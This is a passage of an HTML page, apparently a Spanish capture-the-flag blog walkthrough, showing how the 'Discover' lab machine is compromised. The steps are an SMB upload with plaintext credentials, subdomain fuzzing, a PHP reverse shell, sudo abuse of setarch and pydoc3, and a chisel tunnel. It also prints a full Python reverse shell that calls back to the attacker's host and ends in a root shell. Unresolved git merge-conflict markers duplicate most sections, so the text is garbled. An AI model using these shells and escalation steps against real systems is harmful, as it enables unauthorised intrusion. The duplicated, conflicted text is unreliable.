</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">h1</span>&gt;Under Construction&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">p</span>&gt;We are working to improve our website.&lt;/<span style="color:#f92672">p</span>&gt;
</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">p</span>&gt;contact: support@todiscover.nyx&lt;/<span style="color:#f92672">p</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>Creo el archivo <code>info.php</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">phpinfo</span>();
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Lo subo con el usuario ken.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ smbclient -U &#34;ken%kenken&#34; \\\\192.168.1.17\\ken
</span></span><span style="display:flex;"><span>Try &#34;help&#34; to get a list of possible commands.
</span></span><span style="display:flex;"><span>smb: \&gt; put info.php
</span></span><span style="display:flex;"><span>putting file info.php as \info.php (2,9 kb/s) (average 2,9 kb/s)
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
</span></span></code></pre></div><p>Ahora hago fuerza bruta de subdominios apuntando al archivo <code>info.php</code> que he subido para comprobar que el subdominio interpreta php.</p>
<blockquote>
<p>Gracias d4t4s3c por la pista ;)</p>
</blockquote>
<<<<<<< HEAD
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ wfuzz -t 100 -c --hl=7 -X POST -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &#34;Host: FUZZ.todiscover.nyx&#34; &#34;http://todiscover.nyx/info.php&#34;
</span></span><span class="line"><span class="cl">********************************************************
</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
</span></span><span class="line"><span class="cl">********************************************************
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Target: http://todiscover.nyx/info.php
</span></span><span class="line"><span class="cl">Total requests: 114441
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">=====================================================================
</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
</span></span><span class="line"><span class="cl">=====================================================================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">000015484:   200        3 L      3 W        18 Ch       &#34;smbc&#34;
</span></span></code></pre></div><p>Una vez he encontrado el subdominio, subo una shell con el usuario ken.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ smbclient -U &#34;ken%kenken&#34; \\\\192.168.1.17\\ken
</span></span><span class="line"><span class="cl">Try &#34;help&#34; to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: \&gt; put rs.php 
</span></span><span class="line"><span class="cl">putting file rs.php as \rs.php (575,5 kb/s) (average 289,2 kb/s)
</span></span></code></pre></div><p>Lanzo curl para ejecutar la shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl http://smbc.todiscover.nyx/rs.php
</span></span></code></pre></div><p>Obtengo la shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nc -lvnp 4444
</span></span><span class="line"><span class="cl">listening on [any] 4444 ...
</span></span><span class="line"><span class="cl">connect to [192.168.1.18] from (UNKNOWN) [192.168.1.17] 52250
</span></span><span class="line"><span class="cl">Linux discover 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64 GNU/Linux
</span></span><span class="line"><span class="cl"> 11:00:03 up 50 min,  0 users,  load average: 0.00, 0.00, 0.00
</span></span><span class="line"><span class="cl">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span class="line"><span class="cl">uid=1000(ken) gid=1000(ken) groups=1000(ken)
</span></span><span class="line"><span class="cl">/bin/sh: 0: can&#39;t access tty; job control turned off
</span></span><span class="line"><span class="cl">$ script /dev/null -c bash
</span></span><span class="line"><span class="cl">Script started, output log file is &#39;/dev/null&#39;.
</span></span><span class="line"><span class="cl">ken@discover:/$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">uid=1000(ken) gid=1000(ken) groups=1000(ken)
</span></span></code></pre></div><p>Enumero permisos de sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">ken@discover:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries for ken on discover:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User ken may run the following commands on discover:
</span></span><span class="line"><span class="cl">    (takeshi) NOPASSWD: /usr/bin/setarch
=======
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ wfuzz -t 100 -c --hl=7 -X POST -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &#34;Host: FUZZ.todiscover.nyx&#34; &#34;http://todiscover.nyx/info.php&#34;
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Target: http://todiscover.nyx/info.php
</span></span><span style="display:flex;"><span>Total requests: 114441
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>=====================================================================
</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
</span></span><span style="display:flex;"><span>=====================================================================
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>000015484:   200        3 L      3 W        18 Ch       &#34;smbc&#34;
</span></span></code></pre></div><p>Una vez he encontrado el subdominio, subo una shell con el usuario ken.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ smbclient -U &#34;ken%kenken&#34; \\\\192.168.1.17\\ken
</span></span><span style="display:flex;"><span>Try &#34;help&#34; to get a list of possible commands.
</span></span><span style="display:flex;"><span>smb: \&gt; put rs.php 
</span></span><span style="display:flex;"><span>putting file rs.php as \rs.php (575,5 kb/s) (average 289,2 kb/s)
</span></span></code></pre></div><p>Lanzo curl para ejecutar la shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl http://smbc.todiscover.nyx/rs.php
</span></span></code></pre></div><p>Obtengo la shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nc -lvnp 4444
</span></span><span style="display:flex;"><span>listening on [any] 4444 ...
</span></span><span style="display:flex;"><span>connect to [192.168.1.18] from (UNKNOWN) [192.168.1.17] 52250
</span></span><span style="display:flex;"><span>Linux discover 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64 GNU/Linux
</span></span><span style="display:flex;"><span> 11:00:03 up 50 min,  0 users,  load average: 0.00, 0.00, 0.00
</span></span><span style="display:flex;"><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span style="display:flex;"><span>uid=1000(ken) gid=1000(ken) groups=1000(ken)
</span></span><span style="display:flex;"><span>/bin/sh: 0: can&#39;t access tty; job control turned off
</span></span><span style="display:flex;"><span>$ script /dev/null -c bash
</span></span><span style="display:flex;"><span>Script started, output log file is &#39;/dev/null&#39;.
</span></span><span style="display:flex;"><span>ken@discover:/$ id
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span>uid=1000(ken) gid=1000(ken) groups=1000(ken)
</span></span></code></pre></div><p>Enumero permisos de sudo.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>ken@discover:~$ sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries for ken on discover:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User ken may run the following commands on discover:
</span></span><span style="display:flex;"><span>    (takeshi) NOPASSWD: /usr/bin/setarch
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
</span></span></code></pre></div><p>Para realizar movimiento lateral uso este recurso de <a href="https://gtfobins.github.io/gtfobins/setarch/#sudo">gtfobins</a>.</p>
<pre tabindex="0"><code>ken@discover:~$ sudo -u takeshi setarch $(arch) /bin/bash
takeshi@discover:/home/ken$ id
uid=1001(takeshi) gid=1001(takeshi) grupos=1001(takeshi)
</code></pre><p>Enumero de nuevo permisos de sudo.</p>
<<<<<<< HEAD
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">takeshi@discover:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries for takeshi on discover:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User takeshi may run the following commands on discover:
</span></span><span class="line"><span class="cl">    (root) NOPASSWD: /usr/bin/pydoc3
</span></span></code></pre></div><p>Lanzo <strong>pydoc3</strong> para ver de que se trata y usaré la flag <strong>-b</strong> y <strong>-p</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">takeshi@discover:~$ pydoc3 --help
</span></span><span class="line"><span class="cl">pydoc - the Python documentation tool
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">pydoc3 -b
</span></span><span class="line"><span class="cl">    Start an HTTP server on an arbitrary unused port and open a Web browser
</span></span><span class="line"><span class="cl">    to interactively browse documentation.  This option can be used in
</span></span><span class="line"><span class="cl">    combination with -n and/or -p.
=======
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>takeshi@discover:~$ sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries for takeshi on discover:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User takeshi may run the following commands on discover:
</span></span><span style="display:flex;"><span>    (root) NOPASSWD: /usr/bin/pydoc3
</span></span></code></pre></div><p>Lanzo <strong>pydoc3</strong> para ver de que se trata y usaré la flag <strong>-b</strong> y <strong>-p</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>takeshi@discover:~$ pydoc3 --help
</span></span><span style="display:flex;"><span>pydoc - the Python documentation tool
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pydoc3 -b
</span></span><span style="display:flex;"><span>    Start an HTTP server on an arbitrary unused port and open a Web browser
</span></span><span style="display:flex;"><span>    to interactively browse documentation.  This option can be used in
</span></span><span style="display:flex;"><span>    combination with -n and/or -p.
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
</span></span></code></pre></div><blockquote>
<p>A partir de este punto he añadido el <strong>id_rsa.pub</strong> de mi máquina atacante al <strong>authorized_keys</strong> de la máquina víctima para conectarme de forma más rápida y para tener varias terminales.</p>
</blockquote>
<p>Creo un servidor http con pydoc y lo lanzo con sudo.</p>
<<<<<<< HEAD
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">takeshi@discover:~$ sudo /usr/bin/pydoc3 -b -p 8888
</span></span><span class="line"><span class="cl">Server ready at http://localhost:8888/
</span></span><span class="line"><span class="cl">Server commands: [b]rowser, [q]uit
</span></span><span class="line"><span class="cl">server&gt; 
</span></span></code></pre></div><p>Con otra terminal  me descargo <em>chisel</em> a la máquina victima, le doy permisos de ejecución y lo lanzo como cliente.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">takeshi@discover:/tmp$ ./chisel client 192.168.1.18:9080 R:8888:127.0.0.1:8888
</span></span></code></pre></div><p>En la máquina atacante lanzo <em>chisel</em> como server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ ./chisel server -p 9080 --reverse
</span></span><span class="line"><span class="cl">2023/07/25 12:08:52 server: Reverse tunnelling enabled
</span></span><span class="line"><span class="cl">2023/07/25 12:08:52 server: Fingerprint jDlXFh2ZQowY97V7sttm/E3Hou0jl9ta6e66ZEDT/Rw=
</span></span><span class="line"><span class="cl">2023/07/25 12:08:52 server: Listening on http://0.0.0.0:9080
</span></span><span class="line"><span class="cl">2023/07/25 12:08:55 server: session#1: tun: proxy#R:8888=&gt;8888: Listening
</span></span></code></pre></div><p>Ahora desde mi navegador visito el <code>localhost:8888</code> y veo lo siguiente:</p>
<p><img src="/../machines/nyx/discover/Index_of_Modules.webp" alt="Index_of_Modules"></p>
<p>Creo el archivo <code>noname.py</code> en el home de <strong>takeshi</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">takeshi</span><span class="nd">@discover</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">noname</span><span class="o">.</span><span class="n">py</span> 
</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&#34;192.168.1.18&#34;</span><span class="p">,</span><span class="mi">443</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">,</span><span class="s2">&#34;-i&#34;</span><span class="p">])</span>
</span></span></code></pre></div><p>Refresco la página y veo que aparece el archivo <strong>noname</strong>.</p>
<p><img src="/../machines/nyx/discover/noname_py.webp" alt="noname_py"></p>
<p>Dejo un netcat a la escucha, doy click a <strong>noname</strong> y obtengo el root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nc -lvnp 443
</span></span><span class="line"><span class="cl">listening on [any] 443 ...
</span></span><span class="line"><span class="cl">connect to [192.168.1.18] from (UNKNOWN) [192.168.1.17] 57434
</span></span><span class="line"><span class="cl">root@discover:/home/takeshi# id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) grupos=0(root)
=======
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>takeshi@discover:~$ sudo /usr/bin/pydoc3 -b -p 8888
</span></span><span style="display:flex;"><span>Server ready at http://localhost:8888/
</span></span><span style="display:flex;"><span>Server commands: [b]rowser, [q]uit
</span></span><span style="display:flex;"><span>server&gt; 
</span></span></code></pre></div><p>Con otra terminal  me descargo <em>chisel</em> a la máquina victima, le doy permisos de ejecución y lo lanzo como cliente.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>takeshi@discover:/tmp$ ./chisel client 192.168.1.18:9080 R:8888:127.0.0.1:8888
</span></span></code></pre></div><p>En la máquina atacante lanzo <em>chisel</em> como server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ ./chisel server -p 9080 --reverse
</span></span><span style="display:flex;"><span>2023/07/25 12:08:52 server: Reverse tunnelling enabled
</span></span><span style="display:flex;"><span>2023/07/25 12:08:52 server: Fingerprint jDlXFh2ZQowY97V7sttm/E3Hou0jl9ta6e66ZEDT/Rw=
</span></span><span style="display:flex;"><span>2023/07/25 12:08:52 server: Listening on http://0.0.0.0:9080
</span></span><span style="display:flex;"><span>2023/07/25 12:08:55 server: session#1: tun: proxy#R:8888=&gt;8888: Listening
</span></span></code></pre></div><p>Ahora desde mi navegador visito el <code>localhost:8888</code> y veo lo siguiente:</p>
<p><img src="/../machines/nyx/discover/Index_of_Modules.webp" alt="Index_of_Modules"></p>
<p>Creo el archivo <code>noname.py</code> en el home de <strong>takeshi</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>takeshi<span style="color:#a6e22e">@discover</span>:<span style="color:#f92672">~</span><span style="color:#960050;background-color:#1e0010">$</span> cat noname<span style="color:#f92672">.</span>py 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;192.168.1.18&#34;</span>,<span style="color:#ae81ff">443</span>))
</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>call([<span style="color:#e6db74">&#34;/bin/bash&#34;</span>,<span style="color:#e6db74">&#34;-i&#34;</span>])
</span></span></code></pre></div><p>Refresco la página y veo que aparece el archivo <strong>noname</strong>.</p>
<p><img src="/../machines/nyx/discover/noname_py.webp" alt="noname_py"></p>
<p>Dejo un netcat a la escucha, doy click a <strong>noname</strong> y obtengo el root.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nc -lvnp 443
</span></span><span style="display:flex;"><span>listening on [any] 443 ...
</span></span><span style="display:flex;"><span>connect to [192.168.1.18] from (UNKNOWN) [192.168.1.17] 57434
</span></span><span style="display:flex;"><span>root@discover:/home/takeshi# id
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span>uid=0(root) gid=0(root) grupos=0(root)
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
</span></span></code></pre></div><p>Y con esto ya tenemos resuelta la máquina Discover.</p>
<p>Saludos!</p>

            </div>
<<<<<<< HEAD
        </article></main>
=======
        </article>
    </main>
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
</div>
    <small class="footer_copyright">
        © 2024 .
<<<<<<< HEAD
        
    </small>
</footer><a href="#" title="" id="totop">
=======
        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noreferrer noopener">Hugo blog awesome</a>
        theme on
        <a href="https://gohugo.io" target="_blank" rel="noreferrer noopener">Hugo</a>.
    </small>
</footer><a href="#" title="Go to top" id="totop">
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    
<<<<<<< HEAD






    
    <script src="https://0x-noname.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>

    

</body>
=======
    
    
    <script src="https://0x-noname.github.io/js/script.min.46bd451490183d25f475c182f8fe773c1c787124cec75969e37c871d76aa151f.js" integrity="sha256-Rr1FFJAYPSX0dcGC&#43;P53PBx4cSTOx1lp43yHHXaqFR8="></script>


    </body>
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
</html>
